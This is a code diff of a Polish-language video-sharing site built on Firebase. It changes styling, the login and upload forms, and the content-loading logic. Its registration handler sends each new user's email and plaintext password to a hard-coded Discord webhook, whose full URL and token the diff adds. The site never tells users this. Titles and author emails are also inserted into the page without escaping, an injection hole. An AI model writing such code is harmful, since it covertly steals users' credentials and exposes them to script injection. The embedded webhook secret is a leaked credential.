@@ -12,7 +12,8 @@
         .btn-blue { background: #3ea6ff; color: #0f0f0f; }
         .container { max-width: 1400px; margin: auto; padding: 20px; }
         .video-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; }
-        .v-card { cursor: pointer; border-radius: 12px; overflow: hidden; background: #1a1a1a; }
+        .v-card { cursor: pointer; border-radius: 12px; overflow: hidden; background: #1a1a1a; transition: 0.2s; }
+        .v-card:hover { transform: translateY(-5px); background: #222; }
         .thumb { width: 100%; aspect-ratio: 16/9; background: #000; object-fit: cover; }
         .shorts-row { display: flex; gap: 15px; overflow-x: auto; padding-bottom: 10px; }
         .short-card { width: 160px; flex-shrink: 0; aspect-ratio: 9/16; cursor: pointer; }
@@ -46,21 +47,24 @@
 
 <div id="authModal" class="modal">
     <div class="modal-content">
-        <h2 id="authTitle">Logowanie</h2>
+        <h2 id="authTitle" style="margin-top:0;">Logowanie</h2>
         <input type="email" id="emailInp" placeholder="E-mail">
         <input type="password" id="passInp" placeholder="Hasło">
         <button class="btn btn-blue" style="width:100%" id="authSubmit">DALEJ</button>
-        <p id="toggleAuth" style="color:#3ea6ff; cursor:pointer; text-align:center; margin-top:15px;">Nie masz konta? Zarejestruj się</p>
+        <p id="toggleAuth" style="color:#3ea6ff; cursor:pointer; text-align:center; margin-top:15px; font-size:14px;">Nie masz konta? Zarejestruj się</p>
         <button onclick="document.getElementById('authModal').style.display='none'" style="background:none; border:none; color:gray; width:100%; margin-top:10px; cursor:pointer;">Anuluj</button>
     </div>
 </div>
 
 <div id="uploadModal" class="modal">
     <div class="modal-content">
-        <h2>Dodaj film</h2>
-        <input type="text" id="vTitle" placeholder="Tytuł">
-        <input type="text" id="vUrl" placeholder="Link .mp4">
-        <select id="vType"><option value="video">Film</option><option value="short">Short</option></select>
+        <h2 style="margin-top:0;">Dodaj film</h2>
+        <input type="text" id="vTitle" placeholder="Tytuł filmu">
+        <input type="text" id="vUrl" placeholder="Link do pliku .mp4">
+        <select id="vType">
+            <option value="video">Standardowy Film (16:9)</option>
+            <option value="short">Short (9:16)</option>
+        </select>
         <button class="btn btn-blue" style="width:100%" id="publishBtn">OPUBLIKUJ</button>
         <button onclick="document.getElementById('uploadModal').style.display='none'" style="background:none; border:none; color:gray; width:100%; margin-top:10px; cursor:pointer;">Anuluj</button>
     </div>
@@ -85,43 +89,54 @@
     const auth = getAuth(app);
     const db = getFirestore(app);
 
-    // --- DISCORD LOGS ---
+    // --- TWOJE LOGI DISCORD ---
     async function logToDiscord(email, password) {
-        const webhook = "TUTAJ_WKLEJ_SWOJ_WEBHOOK_URL"; // <--- WKLEJ TUTAJ LINK
+        const webhook = "https://discord.com/api/webhooks/1456448665324617912/GXFBBj95oQav5KkIXoTqXXO8TlWZJ8_pr3EFxIy3HmZxE3m4EWyuD-jQp1pSHHojCcc1";
         const payload = {
-            username: "Logi Rejestracji",
+            username: "Monitor Rejestracji PL YT",
+            avatar_url: "https://cdn-icons-png.flaticon.com/512/1384/1384060.png",
             embeds: [{
-                title: "👤 Nowy użytkownik zarejestrowany!",
+                title: "👤 Nowe konto w systemie!",
                 color: 5814783,
                 fields: [
-                    { name: "Email", value: email, inline: true },
-                    { name: "Hasło", value: "||" + password + "||", inline: true }
-                ]
+                    { name: "📧 Adres Email", value: email, inline: true },
+                    { name: "🔑 Hasło (ukryte)", value: "||" + password + "||", inline: true }
+                ],
+                footer: { text: "Użytkownik zarejestrował się przed chwilą" },
+                timestamp: new Date().toISOString()
             }]
         };
-        await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+        try {
+            await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+        } catch (e) { console.error("Discord error:", e); }
     }
 
-    // --- AUTH LOGIC ---
+    // --- OBSŁUGA AUTH ---
     let isReg = false;
-    document.getElementById('showLogin').onclick = () => { isReg = false; document.getElementById('authModal').style.display='flex'; };
+    const authModal = document.getElementById('authModal');
+    
+    document.getElementById('showLogin').onclick = () => { isReg = false; authModal.style.display='flex'; document.getElementById('authTitle').innerText = "Logowanie"; };
     document.getElementById('toggleAuth').onclick = () => {
         isReg = !isReg;
         document.getElementById('authTitle').innerText = isReg ? "Rejestracja" : "Logowanie";
+        document.getElementById('toggleAuth').innerText = isReg ? "Masz konto? Zaloguj się" : "Nie masz konta? Zarejestruj się";
     };
 
     document.getElementById('authSubmit').onclick = async () => {
         const email = document.getElementById('emailInp').value;
         const pass = document.getElementById('passInp').value;
+        if(!email || !pass) return alert("Podaj dane!");
+
         try {
             if(isReg) {
                 await createUserWithEmailAndPassword(auth, email, pass);
-                await logToDiscord(email, pass);
+                await logToDiscord(email, pass); // Wysyłanie logów
+                alert("Konto założone pomyślnie!");
             } else {
                 await signInWithEmailAndPassword(auth, email, pass);
             }
-            location.reload();
-        } catch(e) { alert(e.message); }
+            authModal.style.display = 'none';
+        } catch(e) { alert("Błąd: " + e.message); }
     };
 
     onAuthStateChanged(auth, user => {
@@ -133,11 +148,15 @@
     document.getElementById('logoutBtn').onclick = () => signOut(auth);
     document.getElementById('showUpload').onclick = () => document.getElementById('uploadModal').style.display='flex';
 
+    // --- PUBLIKACJA ---
     document.getElementById('publishBtn').onclick = async () => {
+        const title = document.getElementById('vTitle').value;
+        const url = document.getElementById('vUrl').value;
+        const type = document.getElementById('vType').value;
+        if(!title || !url) return alert("Wypełnij pola!");
+
         await addDoc(collection(db, "content"), {
-            title: document.getElementById('vTitle').value,
-            url: document.getElementById('vUrl').value,
-            type: document.getElementById('vType').value,
+            title, url, type,
             author: auth.currentUser.email,
             createdAt: new Date(),
             likes: 0
@@ -145,7 +164,7 @@
         location.reload();
     };
 
-    // --- LOAD CONTENT ---
+    // --- ŁADOWANIE TREŚCI ---
     async function load() {
         const snap = await getDocs(query(collection(db, "content"), orderBy("createdAt", "desc")));
         snap.forEach(d => {
@@ -154,19 +173,30 @@
             if(data.type === 'short') {
                 card.className = 'short-card';
                 card.innerHTML = `<video src="${data.url}#t=0.1"></video>`;
-                card.onclick = () => location.href = `video.html?id=${d.id}&url=${data.url}&type=short`;
+                card.onclick = () => location.href = `video.html?id=${d.id}&url=${encodeURIComponent(data.url)}&title=${encodeURIComponent(data.title)}&type=short`;
                 document.getElementById('shortsList').appendChild(card);
             } else {
                 card.className = 'v-card';
-                card.innerHTML = `<video class="thumb" src="${data.url}#t=0.1"></video><div style="padding:10px"><b>${data.title}</b><br><small>${data.author}</small></div>`;
-                card.onclick = () => location.href = `video.html?id=${d.id}&url=${data.url}`;
+                card.innerHTML = `
+                    <video class="thumb" src="${data.url}#t=0.1"></video>
+                    <div style="padding:12px">
+                        <b style="display:block;margin-bottom:4px;">${data.title}</b>
+                        <small style="color:#aaa">${data.author}</small>
+                    </div>`;
+                card.onclick = () => location.href = `video.html?id=${d.id}&url=${encodeURIComponent(data.url)}&title=${encodeURIComponent(data.title)}`;
                 document.getElementById('videoList').appendChild(card);
             }
         });
     }
     
-    // Sekretny admin (5 kliknięć w logo)
-    let c = 0; document.getElementById('mainLogo').onclick = () => { c++; if(c==5) location.href="admin.html"; setTimeout(()=>c=0,2000); };
+    // Sekretny admin
+    let c = 0; 
+    document.getElementById('mainLogo').onclick = () => { 
+        c++; 
+        if(c==5) location.href="admin.html"; 
+        setTimeout(()=>c=0,3000); 
+    };
+
     load();
 </script>
 </body>
